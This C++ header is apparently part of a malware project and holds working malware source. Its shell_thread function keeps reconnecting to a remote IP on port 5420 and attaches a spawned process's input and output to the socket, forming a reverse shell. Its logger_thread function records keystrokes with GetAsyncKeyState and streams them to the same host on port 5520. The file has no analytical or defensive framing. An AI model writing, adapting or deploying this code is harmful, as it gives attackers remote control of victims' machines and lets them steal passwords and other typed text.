#pragma once

#include <winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <thread>
#include <iostream>

#include <ctype.h>

#include <security.hpp>
#include <infecter/infecter.hpp>
#include <api.hpp>

#pragma warning( disable : 4996)

void shell_thread(char* ip, char* process)
{
    while (true)
    {
        SOCKET socket;
        sockaddr_in addr;
        WSADATA version;
        int ret = WSAStartup(MAKEWORD(2, 2), &version);

        socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(ip);
        addr.sin_port = htons(5420);

        if (WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
        {
            closesocket(socket);
            WSACleanup();
            continue; // Reconnect
        }
        else
        {
            char buffer[1024];

            memset(buffer, 0, sizeof(buffer));
            if (recv(socket, buffer, 1024, 0) >= 0)
            {
                STARTUPINFO startup_info;
                PROCESS_INFORMATION process_info;
                memset(&startup_info, 0, sizeof(STARTUPINFO));
                startup_info.cb = sizeof(STARTUPINFO);
                startup_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)socket;


                CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &process_info);
                WaitForSingleObject(process_info.hProcess, INFINITE);
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);

                memset(buffer, 0, sizeof(buffer));
                if (recv(socket, buffer, 1024, 0) <= 0)
                {
                    closesocket(socket);
                    WSACleanup();
                    continue;
                }
            }
            else
            {
                closesocket(socket);
                WSACleanup();
                continue;
            }
        }
    }
}

void logger_thread(char* ip)
{
    while (true)
    {
        SOCKET socket;
        sockaddr_in addr;
        WSADATA version;
        int ret = WSAStartup(MAKEWORD(2, 2), &version);

        socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(ip);
        addr.sin_port = htons(5520);

        if (WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
        {
            closesocket(socket);
            WSACleanup();
            continue; // Reconnect
        }
        else
        {
            while (true)
            {
                for (int key = 8; key <= 190; key++) 
                {
                    SHORT state = GetAsyncKeyState(key);
                    if (state == -32767) 
                    {
                        char key_buffer[4];
                        snprintf(key_buffer, 4, "%c", tolower(key));
                        send(socket, key_buffer, sizeof(key_buffer), 0);
                    }
                }
            }
        }
    }
}
